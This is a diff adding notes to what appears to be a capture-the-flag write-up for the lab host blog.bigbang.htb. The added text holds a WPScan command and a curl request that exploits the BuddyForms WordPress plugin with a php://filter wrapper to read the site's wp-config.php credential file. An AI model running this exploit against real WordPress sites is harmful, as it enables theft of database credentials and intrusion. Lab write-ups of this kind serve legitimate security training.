@@ -39,3 +39,13 @@ Wappalyzer
 
 
 ### WPScan
+
+`wpscan --url http://blog.bigbang.htb`
+
+
+
+Now did curl to exploit BuddyForms plugin to read wp-config.php
+
+Command used: 
+
+    curl ‘http://blog.bigbang.htb/wp-admin/admin-ajax.php' -d “action=upload_image_from_url&url=php://filter/convert.base64-encode/resource=../wp-config.php&id=1&accepted_files=image/gif”
